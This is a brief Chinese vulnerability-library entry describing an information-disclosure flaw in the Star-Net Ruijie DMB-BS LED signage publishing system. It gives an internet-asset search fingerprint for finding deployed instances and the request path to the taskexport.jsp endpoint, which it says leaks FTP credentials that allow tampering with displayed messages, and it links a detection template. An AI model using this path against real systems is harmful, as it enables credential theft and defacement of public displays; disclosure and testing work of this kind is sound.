---
source: "wy876 漏洞文库"
---

# 星网锐捷 DMB-BS LED屏信息发布系统taskexport接口处存在敏感信息泄露

**一、漏洞简介**  
<font style="color:rgb(34, 34, 34);">星网锐捷 DMB-BS LED屏信息发布系统taskexport接口处存在敏感信息泄露，攻击者可以可以通过此漏洞读取 FTP 服务器地址、端口及账号密码，通过 FTP 可篡改 LED 发布信息</font>  
**二、影响版本**

星网锐捷信息发布系统

**三、资产测绘**

```plain
app="STAR_NET-数字标牌系统"
```


●登录

**四、漏洞复现**

```plain
/dmb/out/taskexport.jsp?taskcode
```


[XWRJ-DMB-BS-InformationLeakage.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1719200545313-daca3f8d-524a-48d9-83ba-d930e0d9385b.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ef3dwszacv0ypayp>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
